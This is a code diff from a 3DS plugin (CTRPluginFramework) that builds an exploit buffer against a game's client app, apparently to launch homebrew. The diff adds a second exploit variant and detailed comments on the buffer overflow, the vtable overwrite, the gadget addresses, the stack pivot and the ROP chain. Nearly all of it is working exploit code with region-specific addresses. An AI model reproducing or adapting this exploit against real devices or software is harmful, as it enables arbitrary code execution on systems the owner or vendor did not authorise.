@@ -79,12 +79,15 @@ namespace CTRPluginFramework
 
     static constexpr u32 TRANSFERBLOCKSIZE = 0x37C;                             // The size in bytes of a single transfer block.
 
-	u32 pwnBuffer[TRANSFERBLOCKSIZE / 4] = { 0 };                                // Buffer sent with the vtable pwn
-    int gameRegion = -1;                                                         // Region of the game. EUR -> 0, USA -> 1, JAP -> 2
+	u32 pwnBuffer[TRANSFERBLOCKSIZE / 4] = { 0 };                               // Buffer sent with the vtable pwn
+    int gameRegion = -1;                                                        // Region of the game. EUR -> 0, USA -> 1, JAP -> 2
 
+    #define EXPLOIT_VARIANT 1                                                   // Exploit variant to use, both achieve the same thing
     static constexpr u32 VTABLEPWNBLOCK = 0x1740;                               // Block in the buffer that cointains the vtable pwn
-    static constexpr u32 ORIGSTACK = 0x0FFFFDC8;                                // Original stack addr when the vtable pwn exploit triggers
-    static constexpr u32 LDR0TOR3 = 0x0012E54C;                                 // Jumping here loads [R0, #0x8] into R3
+    static constexpr u32 ORIGSTACK1 = 0x0FFFFDC0;                               // Original stack addr when the vtable pwn first exploit variant triggers 
+    static constexpr u32 ORIGSTACK2 = 0x0FFFFDC8;                               // Original stack addr when the vtable pwn second exploit variant triggers 
+    static constexpr u32 LDR_R3_FROM_R0 = 0x0012E54C;                               // Jumping here loads [R0, #0x8] into R3
+    static constexpr u32 BXLR = LDR_R3_FROM_R0 + 0x58;                              // Jumping here does BX LR, returning immediately
     static constexpr u32 STACKPIVOT = 0x00113688;                               // Jumping here can control SP + PC from value in R3
     static constexpr u32 PLUGINBUFFERSIZE = TRANSFERBLOCKSIZE * 0xA82;          // Size of the fake sent buffer ~2.4MB
     static constexpr u32 STARTBUFFER[] = {                                      // Start of the recv buffer in the client application
@@ -123,25 +126,96 @@ namespace CTRPluginFramework
 		static u32 currblock = 0;
         static u32 buffstart = src;
 		if (currblock == VTABLEPWNBLOCK) { 
-            // vtable pwn magic, wrote it 2 years go and I forgot how it works... x)
-            // Here is a basic explanation:
-            //     Due to the huge size we are sending, the recieve buffer in the client app is overflowed.
-            //     Right after the recieve buffer, there is an object with a vtable used by the main thread every frame (to read the user input).
-            //     By setting the buffer to the proper value, we can cause an arbitrary jump by overwriting a vtable function address.
-            //     We could jump to the stack pivot address at this point, but it requires the proper value in R3, which isn't set yet.
-            //     However, the value of R0 comes from the buffer, so we can call a function that sets up R3 from R0 first.
-            //     After R3 is properly set up, we can jump to the stack pivot and start the ROP chain stored in the recieve buffer.
-
-			pwnBuffer[0x35] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4; // Start buffer + pwn block + offset in current block
-			pwnBuffer[0x37] = 0;
-			pwnBuffer[0x38] = 0;
-			pwnBuffer[0x39] = 0;
-			pwnBuffer[0x3A] = LDR0TOR3;
-
-			pwnBuffer[0x11] = ROPBUF[gameRegion] - ORIGSTACK - 2;
-			pwnBuffer[0x43] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x43 * 4; // Start buffer + pwn block + offset in current block
+            // This block causes the vtable pwn that triggers the actual exploit. During development I fist found the exploit variant 1,
+            // but due to a missunderstanding on how ARM conditional flags work, I thought it was not viable. After that, I found exploit variant 2,
+            // which is the one I went forward with. Now that I properly understand ARM conditional flags, both variants can be used for the exploit
+            // and produce the exact same results.
+            //
+            // In order to start our ROP, we need to somehow change the value of the stack pointer (SP), this can be done using the instructions at STACKPIVOT:
+            //
+            // ADD             SP, SP, R3
+            // LDR             PC, [SP],#4
+            //
+            // As you can see, the first instruction sets the stack pointer from the addition of the current SP value and R3. After that, it pops the value
+            // from SP into PC. If we want to start our ROP, we need to have the proper value in R3, as well as cause a jump to this address (the initial value of SP
+            // is not important, as when the exploit triggers it's always the same and can be adjusted by changing R3).
+            //
+            // NOTE: The following documentation uses C pointer arithmetic notation for accessing pwnBuffer. If you want to obtain the actual byte offset into the buffer
+            // (so that it matches ARM assembly notation), you need to multiply the offset value by 4.
+            // For example, pwnBuffer + 0x35 is actually byte offset (u8*)pwnBuffer + (0x35 * 4) = (u8*)pwnBuffer + 0xD4.
+            //
+#if EXPLOIT_VARIANT == 1
+            // This is the first variant of the exploit, it triggers by overwritting a vtable in the function that updates the button state, which runs every frame.
+            // In the European version of the game, this happens at address 0x004143D0:
+            //
+            // LDR             R1, [R0]
+            // LDR             R1, [R1,#0xC]
+            // BLX             R1
+            //
+            // Normally, the value R0 is meant to be a pointer to an object with a vtable. However, this overlaps with the address pwnBuffer + 0x35.
+            // When the first instruction executes, and the buffer overflow has happened, it causes it to load the contents of pwnBuffer + 0x35 into R1.
+            // After that, the second instruction uses that value + 0xC to obtain a function pointer to jump to. We can use this to cause an arbitrary jump.
+            // First, we set up pwnBuffer[0x35] to point to pwnBuffer + 0x37:
+            pwnBuffer[0x35] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4;
+            // When the game then adds 0xC to that value, it obtains the address pwnBuffer + 0x3A, which we can set to the address we want to jump to:
+			pwnBuffer[0x3A] = LDR_R3_FROM_R0;
+            // So why aren't we jumping into STACKPIVOT directly? As stated before, we need to set R3 to the proper value, but at this point R3 doesn't  
+            // have the proper value. Instead, we have to jump to somewhere else that can set R3 from R0 and then cause another jump to STACKPIVOT
+            // Luckily, the function at LDR_R3_FROM_R0 can do just that (some unimportant parts of the function have been removed):
+            //
+            // LDR             R3, [R0,#8]
+            // ...
+            // LDR             R2, [R0,#0xC]
+            // ...
+            // LDR             R0, [R0,#0x10]
+            // TST             R0, #1
+            // ...
+            // BEQ             branch_R2
+            // ...
+            // branch_R2:
+            //      BX              R2
+            //
+			// At this point, R0 still holds the address pwnBuffer + 0x35, so we can modify the values after
+            // that address to be able to set R3 and jump to STACKPIVOT.
+            // Fist, we set up pwnBuffer + 0x37, which corresponds to [R0, #8] and contains the value that will be placed into R3:
+			pwnBuffer[0x37] = ROPBUF[gameRegion] - ORIGSTACK1;
+            // When ADD SP, SP, R3 executes later, this will set the value of SP to the start of the ROP.
+            // We now have to set up the value of pwnBuffer + 0x38, which corresponds to [R0, #0xC] and contains the value that will be placed into R2, and will
+            // be jumped to later:
+			pwnBuffer[0x38] = STACKPIVOT;
+            // Finally, we need to make sure the branch is performed properly, so we need to set the value at pwnBuffer + 0x39, which corresponds to [R0, #0x10] to
+            // be 0, so the TST, #1 instruction makes the game branch to BX R2:
+            pwnBuffer[0x39] = 0;
+            // At this point, the game will jump to R2, which contains the address of the stack pivot with the proper R3 value set, and eventually, execute ROP.
+#elif EXPLOIT_VARIANT == 2
+            // This is the second variation of the exploit, it triggers by overwritting another vtable in another function that updates the buttons state.
+            // The second variant triggers at a later point after the first variant has already triggered, so in order to use this variant,
+            // we first need to prevent the first variant from crashing. For that, we can just set the function to jump to to immediately return (BX LR).
+            // Check the documentation of the previous variant to understand why these values are used.
+            pwnBuffer[0x35] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4;
+			pwnBuffer[0x3A] = BXLR;
+            // After the first variant has been disabled, we can continue.
+            // In the European version of the game, this happens at address 0x003EA1F4:
+            //
+            // LDR             R1, [R0]
+            // LDR             R1, [R1,#0x18]
+            // BX              R1
+            //
+            // As you can see, this has the same structure as the function in the previous variant, but luckily for us, when it executes, the value at R3 comes
+            // from pwnBuffer + 0x11, so we don't need to jump into an intermediary function to set R3 to the proper value.
+            // Sadly, I can't document where R3 is set, as it comes from a previous function execution and without a debugger, it's very difficult to guess.
+            // First, we set the value at pwnBuffer + 0x11 so that it gets loaded into R3:
+			pwnBuffer[0x11] = ROPBUF[gameRegion] - ORIGSTACK2 - 2;
+            // The "- 2" part is because the value loaded into R3 is actually pwnBuffer[0x11] + 2, so we substract 2 to cancel it out.
+            // Normally, the value R0 is meant to be a pointer to an object with a vtable. However, this overlaps with the address pwnBuffer + 0x43.
+            // When the first instruction executes, and the buffer overflow has happened, it causes it to load the contents of pwnBuffer + 0x43 into R1.
+            // After that, the second instruction uses that value + 0x18 to obtain a function pointer to jump to. We can use this to cause an arbitrary jump.
+            // First, we set up pwnBuffer[0x43] to point to itself:
+			pwnBuffer[0x43] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x43 * 4;
+			// When the game then adds 0x18 to that value, it obtains the address pwnBuffer + 0x49, which we can set to the address we want to jump to:
 			pwnBuffer[0x49] = STACKPIVOT;
-
+            // At this point, the game will jump to the stack pivot with the proper value at R3 set, and eventually, execute ROP.
+#endif
 			currblock++;
 			return (u32)pwnBuffer;
 		}
@@ -185,7 +259,6 @@ namespace CTRPluginFramework
     // about 70 copies are sent). That's the reason we send the otherapp size and the repeat times at the start of the buffer.
     // The reconstruct process checks if the current otherapp block first u32 is 0, if it is, it checks the next copy, and so on. 
     // That's why we set the first value of a block to a magic value if it is 0, so miniapp can differentiate it from a missing block.
-
     void    constructExploitBuffer() {
         u32 otherappsize;
 
@@ -218,7 +291,7 @@ namespace CTRPluginFramework
         otherappsize = roundUp(otherappsize, TRANSFERBLOCKSIZE);
         u32 repeatTimes = (PLUGINBUFFERSIZE - (OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion])) / otherappsize;
 
-        // Set the first u32 in each block in the otherapp to a magic value, so miniapp can differentiate it with a missing block.
+        // Set the first u32 in each block in the otherapp to a magic value in case it is 0, so miniapp can differentiate it with a missing block.
         for (int i = 0; i < otherappsize / TRANSFERBLOCKSIZE; i++) {
             u32* block = (u32*)((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]) + TRANSFERBLOCKSIZE * i);
             if (block[0] == 0)
